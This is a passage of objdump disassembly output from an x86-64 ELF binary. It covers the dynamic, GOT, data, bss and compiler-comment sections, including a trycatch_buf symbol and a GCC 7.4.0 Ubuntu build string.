  201e4f:	00 17                	add    %dl,(%rdi)
  201e51:	00 00                	add    %al,(%rax)
  201e53:	00 00                	add    %al,(%rax)
  201e55:	00 00                	add    %al,(%rax)
  201e57:	00 f8                	add    %bh,%al
  201e59:	06                   	(bad)  
  201e5a:	00 00                	add    %al,(%rax)
  201e5c:	00 00                	add    %al,(%rax)
  201e5e:	00 00                	add    %al,(%rax)
  201e60:	07                   	(bad)  
  201e61:	00 00                	add    %al,(%rax)
  201e63:	00 00                	add    %al,(%rax)
  201e65:	00 00                	add    %al,(%rax)
  201e67:	00 38                	add    %bh,(%rax)
  201e69:	06                   	(bad)  
  201e6a:	00 00                	add    %al,(%rax)
  201e6c:	00 00                	add    %al,(%rax)
  201e6e:	00 00                	add    %al,(%rax)
  201e70:	08 00                	or     %al,(%rax)
  201e72:	00 00                	add    %al,(%rax)
  201e74:	00 00                	add    %al,(%rax)
  201e76:	00 00                	add    %al,(%rax)
  201e78:	c0 00 00             	rolb   $0x0,(%rax)
  201e7b:	00 00                	add    %al,(%rax)
  201e7d:	00 00                	add    %al,(%rax)
  201e7f:	00 09                	add    %cl,(%rcx)
  201e81:	00 00                	add    %al,(%rax)
  201e83:	00 00                	add    %al,(%rax)
  201e85:	00 00                	add    %al,(%rax)
  201e87:	00 18                	add    %bl,(%rax)
  201e89:	00 00                	add    %al,(%rax)
  201e8b:	00 00                	add    %al,(%rax)
  201e8d:	00 00                	add    %al,(%rax)
  201e8f:	00 1e                	add    %bl,(%rsi)
  201e91:	00 00                	add    %al,(%rax)
  201e93:	00 00                	add    %al,(%rax)
  201e95:	00 00                	add    %al,(%rax)
  201e97:	00 08                	add    %cl,(%rax)
  201e99:	00 00                	add    %al,(%rax)
  201e9b:	00 00                	add    %al,(%rax)
  201e9d:	00 00                	add    %al,(%rax)
  201e9f:	00 fb                	add    %bh,%bl
  201ea1:	ff                   	(bad)  
  201ea2:	ff 6f 00             	ljmp   *0x0(%rdi)
  201ea5:	00 00                	add    %al,(%rax)
  201ea7:	00 01                	add    %al,(%rcx)
  201ea9:	00 00                	add    %al,(%rax)
  201eab:	08 00                	or     %al,(%rax)
  201ead:	00 00                	add    %al,(%rax)
  201eaf:	00 fe                	add    %bh,%dh
  201eb1:	ff                   	(bad)  
  201eb2:	ff 6f 00             	ljmp   *0x0(%rdi)
  201eb5:	00 00                	add    %al,(%rax)
  201eb7:	00 08                	add    %cl,(%rax)
  201eb9:	06                   	(bad)  
  201eba:	00 00                	add    %al,(%rax)
  201ebc:	00 00                	add    %al,(%rax)
  201ebe:	00 00                	add    %al,(%rax)
  201ec0:	ff                   	(bad)  
  201ec1:	ff                   	(bad)  
  201ec2:	ff 6f 00             	ljmp   *0x0(%rdi)
  201ec5:	00 00                	add    %al,(%rax)
  201ec7:	00 01                	add    %al,(%rcx)
  201ec9:	00 00                	add    %al,(%rax)
  201ecb:	00 00                	add    %al,(%rax)
  201ecd:	00 00                	add    %al,(%rax)
  201ecf:	00 f0                	add    %dh,%al
  201ed1:	ff                   	(bad)  
  201ed2:	ff 6f 00             	ljmp   *0x0(%rdi)
  201ed5:	00 00                	add    %al,(%rax)
  201ed7:	00 d8                	add    %bl,%al
  201ed9:	05 00 00 00 00       	add    $0x0,%eax
  201ede:	00 00                	add    %al,(%rax)
  201ee0:	f9                   	stc    
  201ee1:	ff                   	(bad)  
  201ee2:	ff 6f 00             	ljmp   *0x0(%rdi)
  201ee5:	00 00                	add    %al,(%rax)
  201ee7:	00 03                	add    %al,(%rbx)
	...

Disassembly of section .got:

0000000000201f40 <_GLOBAL_OFFSET_TABLE_>:
  201f40:	50                   	push   %rax
  201f41:	1d 20 00 00 00       	sbb    $0x20,%eax
	...
  201f56:	00 00                	add    %al,(%rax)
  201f58:	a6                   	cmpsb  %es:(%rdi),%ds:(%rsi)
  201f59:	08 00                	or     %al,(%rax)
  201f5b:	00 00                	add    %al,(%rax)
  201f5d:	00 00                	add    %al,(%rax)
  201f5f:	00 b6 08 00 00 00    	add    %dh,0x8(%rsi)
  201f65:	00 00                	add    %al,(%rax)
  201f67:	00 c6                	add    %al,%dh
  201f69:	08 00                	or     %al,(%rax)
  201f6b:	00 00                	add    %al,(%rax)
  201f6d:	00 00                	add    %al,(%rax)
  201f6f:	00 d6                	add    %dl,%dh
  201f71:	08 00                	or     %al,(%rax)
  201f73:	00 00                	add    %al,(%rax)
  201f75:	00 00                	add    %al,(%rax)
  201f77:	00 e6                	add    %ah,%dh
  201f79:	08 00                	or     %al,(%rax)
  201f7b:	00 00                	add    %al,(%rax)
  201f7d:	00 00                	add    %al,(%rax)
  201f7f:	00 f6                	add    %dh,%dh
  201f81:	08 00                	or     %al,(%rax)
  201f83:	00 00                	add    %al,(%rax)
  201f85:	00 00                	add    %al,(%rax)
  201f87:	00 06                	add    %al,(%rsi)
  201f89:	09 00                	or     %eax,(%rax)
  201f8b:	00 00                	add    %al,(%rax)
  201f8d:	00 00                	add    %al,(%rax)
  201f8f:	00 16                	add    %dl,(%rsi)
  201f91:	09 00                	or     %eax,(%rax)
  201f93:	00 00                	add    %al,(%rax)
  201f95:	00 00                	add    %al,(%rax)
  201f97:	00 26                	add    %ah,(%rsi)
  201f99:	09 00                	or     %eax,(%rax)
  201f9b:	00 00                	add    %al,(%rax)
  201f9d:	00 00                	add    %al,(%rax)
  201f9f:	00 36                	add    %dh,(%rsi)
  201fa1:	09 00                	or     %eax,(%rax)
  201fa3:	00 00                	add    %al,(%rax)
  201fa5:	00 00                	add    %al,(%rax)
  201fa7:	00 46 09             	add    %al,0x9(%rsi)
  201faa:	00 00                	add    %al,(%rax)
  201fac:	00 00                	add    %al,(%rax)
  201fae:	00 00                	add    %al,(%rax)
  201fb0:	56                   	push   %rsi
  201fb1:	09 00                	or     %eax,(%rax)
  201fb3:	00 00                	add    %al,(%rax)
  201fb5:	00 00                	add    %al,(%rax)
  201fb7:	00 66 09             	add    %ah,0x9(%rsi)
  201fba:	00 00                	add    %al,(%rax)
  201fbc:	00 00                	add    %al,(%rax)
  201fbe:	00 00                	add    %al,(%rax)
  201fc0:	76 09                	jbe    201fcb <_GLOBAL_OFFSET_TABLE_+0x8b>
  201fc2:	00 00                	add    %al,(%rax)
  201fc4:	00 00                	add    %al,(%rax)
  201fc6:	00 00                	add    %al,(%rax)
  201fc8:	86 09                	xchg   %cl,(%rcx)
  201fca:	00 00                	add    %al,(%rax)
  201fcc:	00 00                	add    %al,(%rax)
  201fce:	00 00                	add    %al,(%rax)
  201fd0:	96                   	xchg   %eax,%esi
  201fd1:	09 00                	or     %eax,(%rax)
	...

Disassembly of section .data:

0000000000202000 <__data_start>:
	...

0000000000202008 <__dso_handle>:
  202008:	08 20                	or     %ah,(%rax)
  20200a:	20 00                	and    %al,(%rax)
  20200c:	00 00                	add    %al,(%rax)
	...

Disassembly of section .bss:

0000000000202020 <completed.7697>:
	...

0000000000202040 <trycatch_buf>:
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	47                   	rex.RXB
   1:	43                   	rex.XB
   2:	43 3a 20             	rex.XB cmp (%r8),%spl
   5:	28 55 62             	sub    %dl,0x62(%rbp)
   8:	75 6e                	jne    78 <_init-0x800>
   a:	74 75                	je     81 <_init-0x7f7>
   c:	20 37                	and    %dh,(%rdi)
   e:	2e 34 2e             	cs xor $0x2e,%al
  11:	30 2d 31 75 62 75    	xor    %ch,0x75627531(%rip)        # 75627548 <_end+0x75425440>
  17:	6e                   	outsb  %ds:(%rsi),(%dx)
  18:	74 75                	je     8f <_init-0x7e9>
  1a:	31 7e 31             	xor    %edi,0x31(%rsi)
  1d:	38 2e                	cmp    %ch,(%rsi)
  1f:	30 34 2e             	xor    %dh,(%rsi,%rbp,1)
  22:	31 29                	xor    %ebp,(%rcx)
  24:	20 37                	and    %dh,(%rdi)
  26:	2e 34 2e             	cs xor $0x2e,%al
  29:	30 00                	xor    %al,(%rax)
